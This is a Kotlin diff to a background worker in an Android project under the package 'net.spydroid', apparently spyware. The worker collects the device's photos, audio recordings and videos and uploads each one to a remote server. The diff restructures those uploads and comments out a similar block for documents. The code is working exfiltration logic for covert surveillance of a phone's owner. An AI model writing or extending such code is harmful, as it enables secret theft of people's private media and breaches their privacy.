@@ -27,6 +27,7 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import net.spydroid.common.local.LocalDataProvider
 import net.spydroid.common.remote.RemoteDataProvider
 import java.io.File
@@ -40,8 +41,15 @@ class ShareDataWork(private val appContext: Context, workerParams: WorkerParamet
     private val remoteDataProvider = RemoteDataProvider.current(appContext)
     private val scope = CoroutineScope(Dispatchers.IO)
     private fun getFileFromUri(uri: Uri, ext: String): File {
+
+        val tempFile = when (ext) {
+            "jpg" -> "image"
+            "mp4" -> "video"
+            "mp3" -> "audio"
+            else -> "unknown"
+        }
         val inputStream: InputStream? = appContext.contentResolver.openInputStream(uri)
-        val file = File(appContext.cacheDir, "tempFile_${System.currentTimeMillis()}.$ext")
+        val file = File(appContext.cacheDir, "${tempFile}_${System.currentTimeMillis()}.$ext")
 
         val outputStream = FileOutputStream(file)
         val buffer = ByteArray(1024)
@@ -60,59 +68,69 @@ class ShareDataWork(private val appContext: Context, workerParams: WorkerParamet
 
     override fun doWork(): Result {
         try {
-            scope.launch {
 
+
+            /*
+
+           scope.launch {
                 localDataProvider.currentMutimedia.collect {
+                    withContext(Dispatchers.IO) {
 
-                    if (!it.images.isNullOrEmpty()) {
-                        it.images!!.map { uri ->
-                            scope.launch(Dispatchers.IO) {
-                                remoteDataProvider.setFile(
-                                    getFileFromUri(uri, ext = "jpg"),
-                                    type = "IMAGE",
+                       if (!it.documents.isNullOrEmpty()) {
+                            it.documents!!.map { uri ->
+                               remoteDataProvider.setFile(
+                                    getFileFromUri(uri),
+                                    type = "DOCUMENT",
                                     alias = "PRUEBA_A03s"
                                 )
                             }
                         }
                     }
+                }
+            }
 
-                    if (!it.videos.isNullOrEmpty()) {
-                        it.videos!!.map { uri ->
-                            scope.launch(Dispatchers.IO) {
-                                remoteDataProvider.setFile(
-                                    getFileFromUri(uri, ext = "mp4"),
-                                    type = "VIDEO",
-                                    alias = "PRUEBA_A03s"
-                                )
+             */
+
+            scope.launch {
+                localDataProvider.currentMutimedia.collect { multimediaData ->
+                    withContext(Dispatchers.IO) {
+
+                        if (!multimediaData.images.isNullOrEmpty()) {
+                            multimediaData.images!!.forEach { uri ->
+                                launch {
+                                    remoteDataProvider.setFile(
+                                        getFileFromUri(uri, ext = "jpg"),
+                                        type = "IMAGE",
+                                        alias = "PRUEBA_A03s"
+                                    )
+                                }.join()
+                            }
+                        }
+
+                        if (!multimediaData.audios.isNullOrEmpty()) {
+                            multimediaData.audios!!.forEach { uri ->
+                                launch {
+                                    remoteDataProvider.setFile(
+                                        getFileFromUri(uri, ext = "mp3"),
+                                        type = "AUDIO",
+                                        alias = "PRUEBA_A03s"
+                                    )
+                                }.join()
+                            }
+                        }
+
+                        if (!multimediaData.videos.isNullOrEmpty()) {
+                            multimediaData.videos!!.forEach { uri ->
+                                launch {
+                                    remoteDataProvider.setFile(
+                                        getFileFromUri(uri, ext = "mp4"),
+                                        type = "VIDEO",
+                                        alias = "PRUEBA_A03s"
+                                    )
+                                }.join()
                             }
                         }
                     }
-
-                    if (!it.audios.isNullOrEmpty()) {
-                        it.audios!!.map { uri ->
-                            scope.launch(Dispatchers.IO) {
-                                remoteDataProvider.setFile(
-                                    getFileFromUri(uri, ext = "mp3"),
-                                    type = "AUDIO",
-                                    alias = "PRUEBA_A03s"
-                                )
-                            }
-                        }
-                    }
-
-                    /*
-
-                   if (!it.documents.isNullOrEmpty()) {
-                        it.documents!!.map { uri ->
-                            remoteDataProvider.setFile(
-                                getFileFromUri(uri),
-                                type = "DOCUMENT",
-                                alias = "PRUEBA_A03s"
-                            )
-                        }
-                    }
-                     */
-
                 }
             }
 
